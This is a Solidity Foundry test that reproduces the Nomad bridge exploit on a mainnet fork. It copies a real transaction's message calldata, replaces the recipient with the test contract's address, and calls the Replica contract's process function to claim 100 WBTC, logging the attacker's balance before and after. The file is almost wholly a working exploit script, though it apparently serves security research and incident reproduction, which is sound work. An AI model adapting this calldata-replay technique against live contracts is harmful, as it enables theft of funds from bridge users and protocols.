// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

//healthy version 
CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
//a recently attacked Nomad transaction,but after the previous replicated attack 
//let's see if Nomad has fixed the bug 
IReplica constant Replica = IReplica(0x94A84433101A10aEda762968f6995c574D1bF154);
IERC20 constant WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);

contract Attacker is Test {
    function setUp() public {
        cheat.createSelectFork("mainnet", 15493434);
        cheat.label(address(Replica), "Replica");
        cheat.label(address(WBTC), "WBTC");
    }

    function testExploit() public {
        console.log("Attackers can copy the original user's transaction calldata and replacing the receive address with a personal one.");
        console.log("We mock how attackers/whitehats replay the calldata at block 15259100\n");    // Txhash : 0xa5fe9d044e4f3e5aa5bc4c0709333cd2190cba0f4e7f16bcf73f49f83e4a5460

        emit log_named_decimal_uint("Attacker WBTC Balance", WBTC.balanceOf(address(this)), 8);
        console.log("Attacker claim 100 WBTC from NomadBridge...");
        
        // Copy inputdata in txhash(0xa5fe9d044e4f3e5aa5bc4c0709333cd2190cba0f4e7f16bcf73f49f83e4a5460), but replacing receive address
        bytes memory msgP1 = hex"6265616d000000000000000000000000d3dfd3ede74e0dcebc1aa685e151332857efce2d000013d60065746800000000000000000000000088a69b4e698a4b090df6cf5bd7b2d47325ad30a3006574680000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c59903000000000000000000000000";
        console.log("what's address(this)", address(this));
        bytes memory recvAddr = abi.encodePacked(address(this));
        bytes memory msgP2 = hex"00000000000000000000000000000000000000000000000000000002540be400e6e85ded018819209cfb948d074cb65de145734b5b0852e4a5db25cac2b8c39a";
        bytes memory _message = bytes.concat(msgP1, recvAddr, msgP2);
        bool suc = Replica.process(_message);
        require(suc, "Exploit failed");

        emit log_named_decimal_uint("Attacker WBTC Balance", WBTC.balanceOf(address(this)), 8);
    }
}

interface IReplica {
    function process(bytes memory _message) external returns (bool _success);
}